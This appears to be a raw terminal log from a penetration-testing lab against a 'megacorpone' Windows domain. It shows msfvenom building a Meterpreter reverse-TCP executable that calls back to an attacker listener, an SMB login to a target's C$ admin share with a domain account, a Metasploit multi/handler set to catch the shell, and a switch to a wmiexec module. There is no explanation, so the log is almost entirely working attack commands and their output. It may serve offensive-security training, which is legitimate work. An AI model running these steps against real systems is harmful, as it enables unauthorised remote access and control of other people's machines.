```
┌──(root💀kali)-[/home/sysadmin]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes


┌──(root💀kali)-[/home/sysadmin]
└─# ls -la                                                                                                                   127 ⨯
total 1908
drwxr-xr-x 16 sysadmin sysadmin    4096 Apr  4 18:10 .
drwxr-xr-x  3 root     root        4096 May 10  2021 ..
-rw-r--r--  1 sysadmin sysadmin     220 May 10  2021 .bash_logout
-rw-r--r--  1 sysadmin sysadmin    4705 May 10  2021 .bashrc
-rw-r--r--  1 sysadmin sysadmin    3526 May 10  2021 .bashrc.original
drwxr-xr-x 10 sysadmin sysadmin    4096 Jan  4  2022 .cache
drwx------  8 sysadmin sysadmin    4096 May 10  2021 .config
drwxr-xr-x  2 sysadmin sysadmin    4096 May 10  2021 Desktop
-rw-r--r--  1 sysadmin sysadmin      55 May 10  2021 .dmrc
drwxr-xr-x  2 sysadmin sysadmin    4096 May 10  2021 Documents
drwxr-xr-x  2 sysadmin sysadmin    4096 May 10  2021 Downloads
-rw-r--r--  1 sysadmin sysadmin   11759 May 10  2021 .face
lrwxrwxrwx  1 sysadmin sysadmin       5 May 10  2021 .face.icon -> .face
drwx------  3 sysadmin sysadmin    4096 Jan  4  2022 .gnupg
-rw-------  1 sysadmin sysadmin       0 May 10  2021 .ICEauthority
drwxr-xr-x  3 sysadmin sysadmin    4096 May 10  2021 .local
drwx------  5 sysadmin sysadmin    4096 May 10  2021 .mozilla
drwxr-xr-x  2 sysadmin sysadmin    4096 May 10  2021 Music
drwxr-xr-x  2 sysadmin sysadmin    4096 May 10  2021 Pictures
-rw-r--r--  1 sysadmin sysadmin     807 May 10  2021 .profile
drwxr-xr-x  2 sysadmin sysadmin    4096 May 10  2021 Public
-rwxr-xr-x  1 sysadmin sysadmin      71 May 10  2021 run.sh
-rw-r--r--  1 sysadmin sysadmin      66 May 10  2021 .selected_editor
-rw-r--r--  1 root     root       73802 Apr  4 18:10 shell.exe
drwxr-xr-x  2 sysadmin sysadmin    4096 May 10  2021 Templates
drwxr-xr-x  2 sysadmin sysadmin    4096 May 10  2021 Videos
drwx------  2 sysadmin sysadmin    4096 Apr  4 16:15 .vnc
-rw-------  1 sysadmin sysadmin     401 Apr  4 16:15 .Xauthority
-rw-------  1 sysadmin sysadmin 1725625 Apr  4 16:15 .xsession-errors
-rw-------  1 sysadmin sysadmin   11819 May 18  2021 .xsession-errors.old
-rw-------  1 sysadmin sysadmin    1731 May 11  2021 .zsh_history
-rw-r--r--  1 sysadmin sysadmin    8381 May 10  2021 .zshrc

┌──(root💀kali)-[/home/sysadmin]
└─# smbclient //172.22.117.20/C$ -U megacorpone/tstark

```

```
┌──(root💀kali)-[/home/sysadmin]
└─# smbclient //172.22.117.20/C$ -U megacorpone/tstark                                                                         1 ⨯
Enter MEGACORPONE\tstark's password:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Fri Apr  4 17:14:45 2025
  $WinREAgent                        DH        0  Tue Oct 19 15:30:59 2021
  bootmgr                          AHSR   413738  Sat Dec  7 04:08:37 2019
  BOOTNXT                           AHS        1  Sat Dec  7 04:08:37 2019
  Documents and Settings          DHSrn        0  Mon May 10 08:16:44 2021
  DumpStack.log.tmp                 AHS     8192  Fri Apr  4 16:40:36 2025
  idle-tracking                       D        0  Thu Feb 27 15:06:05 2025
  pagefile.sys                      AHS 1811939328  Fri Apr  4 16:40:36 2025
  PerfLogs                            D        0  Sat Dec  7 04:14:16 2019
  Program Files                      DR        0  Thu Feb 27 14:47:57 2025
  Program Files (x86)                DR        0  Thu Nov 19 02:33:53 2020
  ProgramData                       DHn        0  Thu Feb 27 14:57:00 2025
  Recovery                         DHSn        0  Mon May 10 08:16:51 2021
  shell.exe                           A     7168  Tue Jan 18 18:27:18 2022
  swapfile.sys                      AHS 268435456  Fri Apr  4 16:40:36 2025
  System Volume Information         DHS        0  Mon May 10 01:19:02 2021
  Users                              DR        0  Mon Jan 17 17:24:45 2022
  Windows                             D        0  Fri Apr  4 17:41:29 2025

                33133914 blocks of size 4096. 26663430 blocks available
smb: \>
```

`Windows Privilege Escalation`

```
 msf6 > search multi handler

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   0   exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1   exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3   exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4   exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5   exploit/multi/handler                                                 manual     No     Generic Payload Handler
   6   exploit/multi/http/hp_sitescope_uploadfileshandler   2012-08-29       good       No     HP SiteScope Remote Code Execution
   7   exploit/windows/firewall/blackice_pam_icq            2004-03-18       great      No     ISS PAM.dll ICQ Parser Buffer Overflow
   8   exploit/windows/browser/ms05_054_onload              2005-11-21       normal     No     MS05-054 Microsoft Internet Explorer JavaScript OnLoad Handler Remote Code Execution
   9   exploit/windows/browser/ms13_080_cdisplaypointer     2013-10-08       normal     No     MS13-080 Microsoft Internet Explorer CDisplayPointer Use-After-Free
   10  exploit/multi/http/maracms_upload_exec               2020-08-31       excellent  Yes    MaraCMS Arbitrary PHP File Upload
   11  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   12  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   13  exploit/linux/http/rconfig_ajaxarchivefiles_rce      2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   14  auxiliary/dos/http/webrick_regex                     2008-08-08       normal     No     Ruby WEBrick::HTTP::DefaultFileHandler DoS
   15  auxiliary/dos/http/squid_range_dos                   2021-05-27       normal     No     Squid Proxy Range Header DoS
   16  exploit/linux/http/trendmicro_websecurity_exec       2020-06-10       excellent  Yes    Trend Micro Web Security (Virtual Appliance) Remote Code Execution
   17  exploit/multi/http/wp_ait_csv_rce                    2020-11-14       excellent  Yes    WordPress AIT CSV Import Export Unauthenticated Remote Code Execution
   18  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence


Interact with a module by name or index. For example info 18, use 18 or use exploit/linux/local/yum_package_manager_persistence

msf6 > use 5
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) >

msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.22.117.100   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > use scanner/smb/impacket/wmiexec
msf6 auxiliary(scanner/smb/impacket/wmiexec) >


--------------------------------------------------------------------

msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.22.117.100   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > use scanner/smb/impacket/wmiexec
msf6 auxiliary(scanner/smb/impacket/wmiexec) >

```